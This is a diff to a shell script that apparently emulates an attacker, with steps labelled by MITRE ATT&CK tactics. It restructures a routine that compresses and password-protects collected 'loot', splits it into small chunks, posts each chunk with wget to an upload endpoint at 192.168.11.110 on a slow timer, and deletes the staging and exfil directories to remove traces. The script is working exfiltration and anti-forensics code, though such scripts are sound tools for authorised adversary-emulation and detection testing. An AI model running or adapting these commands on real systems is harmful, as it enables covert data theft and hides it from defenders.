@@ -52,29 +52,34 @@ function discovery() {
 # Tacttic: Exfiltration
 # Technique:  Archive Collected Data: Archive via Library https://attack.mitre.org/techniques/T1560/002/
 ############################################
-function exfil() {
+function stage_exfil() {
 echo -e "Compress and encrypt all collected data for exfil "
 zip --password "Hope" /tmp/.staging/loot.zip /tmp/.staging/* > /dev/null 2>&1
 
 echo -e "Prepare Exfil data - Split file into small chucks (23byte) before Exfil "
-split -a 15 -b 23 "/tmp/.staging/loot.zip" "/tmp/.exfil/loot.zip.part-"
+split -a 15 -b 55 "/tmp/.staging/loot.zip" "/tmp/.exfil/loot.zip.part-"
 
-for f in $(ls /tmp/.exfil/loot.zip.*); do wget --post-file=$f https://192.168.11.110/upload.php -q; sleep 2m; done
 }
-
 
 ############################################
 # Tactic: Defense Evasion
 # Technique: Delete File Indicator Removal on Host: File Deletion https://attack.mitre.org/techniques/T1070/004/
 ############################################
 function cleanup() {
-  rm -rf /tmp/.staging/
   rm -rf /tmp/payback
-  # Optionally, delete exfil directory to clean up
-#  rm -rf /tmp/.exfil/
+  rm -rf /tmp/.staging/
 }
 
+#################################################
+# Exfil and Cleanup - Indicator Removal on Host
+#################################################
+function exfil() {
+  for f in $(ls /tmp/.exfil/loot.zip.*); do wget --post-file=$f https://192.168.11.110/upload.php -q; sleep 2m; done
+  # Optionally, delete exfil directory to clean up
+  rm -rf /tmp/.exfil/
+}
 
 discovery
-exfil
+stage_exfil
 cleanup
+exfil
